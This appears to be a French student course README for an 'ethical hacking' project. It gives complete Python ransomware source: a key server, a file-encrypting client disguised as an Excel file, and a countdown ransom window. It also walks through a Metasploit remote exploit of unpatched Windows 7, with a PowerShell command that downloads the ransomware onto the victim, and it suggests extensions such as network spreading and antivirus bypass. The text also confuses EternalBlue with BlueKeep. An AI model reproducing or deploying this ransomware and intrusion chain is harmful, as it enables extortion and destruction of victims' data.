# SR2I 203 - Ethical Hacking - Ransomw

# Introduction

Dans un but éducatif, ce projet concerne la création d'un ransomware et de l'exploitation d'une vulnérabilité Windows pour l'utiliser. Rappelons qu'il est illégal d'utiliser ce genre de logiciel sur une machine qui ne vous appartient pas, quelqu'en soit le but.

Commençons par rappeler le principe d'un ransomware: Il s'agit d'un logiciel malveillant qui lors de son execution chiffre l'ensemble des fichiers présents sur l'ordinateur de la victime. La victime n'a donc plus accès à ses fichiers qui sont cryptés et seul l'attaquant possède la clé de déchiffrement. Ces attaques sont parmi les attaques informatiques les plus répandues alors nous vous recommandons de ne jamais ouvrir un fichier sans vérification, que vous le receviez par mail ou autre.



Le ransomware que nous allons créer repose sur les fonctions encrypt_file et decrypt_file qui vont servir à chiffrer et dechiffrer les fonctions.

La fonction check_key() sert à vérifier que la clé entrée par la victime est correcte. Si c'est le cas, les fichiers sont déchiffrés.

## Demonstration de l'exécution du ransomware


https://user-images.githubusercontent.com/123843120/215294573-ec373cbd-2dfa-4c0d-8bf9-4f55f41da392.mp4



## Principe de notre code

Nous allons utiliser un protocole de chiffrement symétrique. Il est toutefois possible d'utiliser un chiffrement asymétrique. Le chiffrement symétrique consiste à chiffrer un fichier avec une clé privé et le déchiffrer avec cette même clé. Le mot "symétrie" vient du fait qu'on utilise la même clé pour le chiffrement et déchiffrement.
Le ransomware a été configuré pour ne chiffrer que les fichiers présents dans le dossier nommé "Important" pour des raisons pratiques. Pour la même raison, la fenêtre demandant d'entrer la clé peut être fermé, ce qui n'est pas le cas en réalité.

## Coté attaquant

Considérons deux machines A et V, les machines de l'attaquant et de la victime.
Le principe est le suivant: 
L'attaquant lance le fichier server.py qui va ouvrir une socket qui va rester "listening" en attendant une connexion. Elle va par la même occasion afficher la clé pouvant servir à déchiffrer les fichiers.

![alt text](screenshots/server.png "Lancement du serveur sur la machine A")


Lorsque la victime execute le ransomware, l'attaquant reçoit alors son IP : 

![alt text](screenshots/server2.png "La victime a executé e ransomware")


L'attaquant possède donc la clé que la victime va devoir entrer.

Voici le code correspondant au serveur: 
```python
from cryptography.fernet import Fernet
import socket

#Generation de la clé et on l'affiche
key= Fernet.generate_key()
print("Your key is:", key)

#On crée la socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("", 4321))
s.listen()

conn, addr= s.accept()
print(addr, "connected")

#Quand on reçoit la "key",on envoie la clé
msg= conn.recv(2048).decode()

if msg == "key": 
    conn.send(key)
    print("Key send !")
    
```


## Coté victime


De son côté, la victime reçoit un fichier .exe nommé contactEmployee avec une icone d'un fichier Excel. 
Elle pense alors ouvrir un fichier excel banal mais en réalité elle ouvre un executable qui va executer le code python suivant:
![alt text](screenshots/executable.png "Ransomware camouflé")


Sur l'image, il s'agit de Windows 7 mais le ransomware fonctionne sur toutes les versions de Windows postérieurs à Windows 7.

Lorsque l'executable se lance, tous les fichiers du dossier "Important" sont chiffrés et une fenêtre apparaît avec un compte à rebours, la victime doit entrer la clé que l'attaquant possède sinon les fichiers seront supprimés.


![alt text](screenshots/executable2.png "Ransomware camouflé")
![alt text](screenshots/executable3.png "Ransomware camouflé")



Le code exécuté est:

```python
from cryptography.fernet import Fernet
import socket, os, pyfiglet
import tkinter as tk
import base64
import traceback

#Fonction de chiffrement
def encrypt_file(path):
    if not path.endswith(".encrypted"):
        path_without_ext = os.path.splitext(path)[0]
        new_path = path_without_ext + ".encrypted"
        #os.rename(path, new_path)
        with open(path, "rb") as normal_file:
            normal_content=normal_file.read()
            with open(new_path, "wb") as encrypted_file:
                encrypted_content= fn.encrypt(normal_content)
                encrypted_file.write(encrypted_content)
                encrypted_file.close()
            normal_file.close()
        os.remove(path)


#Fonction de dechiffrement
def decrypt_file(path):
    if path.endswith(".encrypted"):
        path_without_ext = os.path.splitext(path)[0]
        text=os.path.splitext(path)
        with open(path, "rb") as encrypted_file:
            # Stocker les données lues dans une variable
            encrypted_content = encrypted_file.read()
            with open(path_without_ext, "wb") as normal_file:
                decrypted_content=fn.decrypt(encrypted_content)
                normal_file.write(decrypted_content)
                normal_file.close()
            encrypted_file.close()
        os.remove(path)




#Fonction qui verifie la cle
def check_key():
    key_e=entry.get()
    key_e=key_e.encode(encoding = 'UTF-8')
    if key_e==key:
        print("Meme clé")
    else:
        print("Pas la même clé")
    try:
        for path, dirs, files in os.walk(relative_path):
            for f in files:
                decrypt_file(os.path.join(path, f))
        label1['text'] = "Dechiffrement realise avec succes"
    except Exception as e:
        label1['text'] = "Cle invalide, veuillez reessayer"
        traceback.print_exc()




#Creation de la socket et connexion, on envoie "key" quand on reçoit la clé
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 4321))
s.send(b'key')
key = s.recv(2048)
s.close()

#creation d'un objet fernet nous permettant de chiffrer ou dechiffrer
fn= Fernet(key)

#On encrypte chaque fichier
relative_path="./Important"
for path, dirs, files in os.walk(relative_path):
    for f in files: 
        encrypt_file(os.path.join(path, f))


# Utilisation de pyfiglet pour faire une banniere
banner= pyfiglet.figlet_format("Vous avez ete victime de SR2I - 203")
print(banner)


def countdown(count):
    hour, minute, second = count.split(':')
    hour = int(hour)
    minute = int(minute)
    second = int(second)

    label['text'] = '{}:{}:{}'.format(hour, minute, second)

    if second > 0 or minute > 0 or hour > 0:
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
        root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second)) 
    else:
        label['text'] = "Time's up!"
        label.config(fg='red')

root = tk.Tk()
root.title('SR2I-203 Ransomware')
root.geometry('900x500')
root.resizable(False, False)

label1 = tk.Label(root, text='Vos donnees sont prises en otage mais ne me payez pas,\n donnez moi juste une bonne note"\n\n', font=('calibri', 12,'bold'))
label1.pack()

label = tk.Label(root,font=('calibri', 50,'bold'), fg='white', bg='blue')
label.pack()

entry = tk.Entry(root, font=('calibri', 20))
entry.pack()

submit_button = tk.Button(root, text="Submit", command=check_key)
submit_button.pack()

# call countdown first time    
countdown('01:30:00')
root.mainloop()


```
Le fichier .exe a été généré à l'aide de Pyinstaller. Sur l'image, il s'agit de Windows 7 mais le ransomware fonctionne sur toutes les versions de Windows postérieurs à Windows 7.
La commande pour générer le fichier à partir de Pyinstaller est ```pyinstaller --onefile --icon=icon.ico malware.py```. Dans mon cas, j'ai eu une erreur concernant la bibliothèque pyfiglet, j'ai pu la résoudre en ajoutant: ``` --collect-all pyfiglet```. Je conseille d'utiliser pyinstaller directement sur Windows 7 pour s'assurer de la compatibilité de l'executable avec Windows 7.





## Exploitation de Eternalblue doublepulsar

Passons à l'étape consistant à l'exploitation d'une faille Windows de connexion à distance (RDE: Remote Desktop Exploit). La faille que l'on va utiliser est très connue, il s'agit de Eternalblue Doublepulsar, elle est présente dans les versions de Windows antérieur à Windows 8. Il s'agit donc des versions Windows 7 et moins.

Pour notre démonstration, nous utiliserons une version de Windows 7 n'ayant pas été patché. Les commandes à executer sont plutôt simple.
Nous commencons par utiliser nmap pour scanner l'ensemble des ports ouvets de notre machine vulnérable.

```
nmap -p 3389 "ip machine vulnérable"
```

Le port 3389 doit avoir le statut "open". Si ce n'est pas le cas, vous devez l'activer sur votre machine Windows.

Passons à l'utilisation de Metasploit. Metasplit est un logiciel ayant pour but de fournir des informations sur les vulnérabilités de systèmes informatiques, nous commençons par analyser les versions présentes de l'exploit sur notre système.

```search bluekeep```
Nous observons qu'il y'a l'auxiliary et l'exploit de Bluekeep. De ce que j'ai pu comprendre, le premier permet de vérifier que la machine est bien vulnérable en vérifiant qu'elle possède un protocole de RCE (accès à distance).
Le deuxième est l'exploit en lui-même qui nous permet d'avoir accès directement aux commandes de la machine.

![2](https://user-images.githubusercontent.com/123843120/216727247-5b763cfe-92d6-40ff-874a-04d7368227d4.png)


Ce qui donne donc ça:

![3](https://user-images.githubusercontent.com/123843120/216727269-a9b6d37b-70e2-4f2a-bfd1-e4e659bb4c89.png)


Concernant l'exploit, nous utilisions la commande ```show options```. Cette commande permet de nous détailler les options nécessaires pour pouvoir lancer l'exploit. Ici, nous voyons qu'il est nécessaire de donner les adresses IP Rhosts et Lhost. Ils représentent respectivement l'IP de la victime et de l'attaquant. En pratique, Lhost se définit automatiquement comme l'IP de la machine de l'attaquant (ici 192.168.1.95).

![4](https://user-images.githubusercontent.com/123843120/216727303-73dcfe76-213b-4f99-9a67-b679778c10e2.png)

Ensuite, nous configurons la machine qui sera la victime, en accord avec ce que le scan nmap nous a donné (le scan donne la version de l'OS de la victime).
![5](https://user-images.githubusercontent.com/123843120/216728108-41033e21-911c-47ec-9cea-2eb4291cdfcc.png)

On voit alors qu'en bas de notre "show options", il y'a les détails de l'exploit target.
![6](https://user-images.githubusercontent.com/123843120/216728215-225b312a-9213-41f3-984c-d1f1da5ddaf5.png)

Nous avons configuré toutes les options obligatoires, il ne nous reste plus qu'à exploiter la faille avec la commande
```exploit```

Nous avons alors accès à la console de la victime. Il reste à télécharger le ransomware depuis un lien ou nous l'avons publié (pour moi, sur Filetransfer) depuis l'invité de commande. Je n'ai pas trouvé de moyen simple de télécharger le fichier depuis Internet puisqu'il faut toujours installer un outil pour télécharger depuis l'invite de commande.
Le moyen le plus efficace pour moi est de passer par le Powershell, pour cela on execute les commandes suivantes:

```powershell -c "Invoke-WebRequest -Uri 'https://www.website.com/fichier.exe' -OutFile 'C:\Users\vboxuser\Desktop'```

Ensuite, il ne reste plus qu'à se rendre dans le répertoire "Desktop" avec l'invité de commande et à executer le fichier avec ```./employeeData.exe```






## Améliorations possibles

- Pour des raisons pratiques, nous avons limité le chiffrement au dossier "Important" mais il est facilement possible de chiffrer tous les dossiers présents dans l'ordinateur.
- Dans notre code, le serveur arrête d'écouter dès qu'une victime lance le script. Il est préférable que le serveur reste en écoute et génère plusieurs clés pour chaque utilisateur qui se connecte. 
- Il est possible d'améliorer le ransomware pour qu'il se diffuse aux autres ordinateurs du réseau mais ça demande un travail assez conséquent.
- Ici, notre ransomware serait facilement arrêté par un antivirus mais mes tests ont montré qu'il est possible de bypasser l'anti-virus en executant le .exe depuis le terminal. 
- La clé pour dechiffrer n'est pas difficilement trouvable vu qu'elle n'est pas réellement effacé. Cependant, l'effacer n'est pas difficile mais je n'ai pas pu continuer par manque de temps.



## Difficultés rencontrées
- J'ai rencontré des difficultés à déchiffrer le fichier. Le fichier déchiffré était vide, j'ai passé beaucoup d'heures à trouver d'ou venait le problème.
- Lors de la conversion du fichier python en .exe, je devais rendre possible l'execution du fichier .exe sur un système Windows 7 pour pouvoir exploiter la faille. Cela m'a aussi pris du temps à adapter. Pour cela, la documentation de pyinstaller m'a aidé.
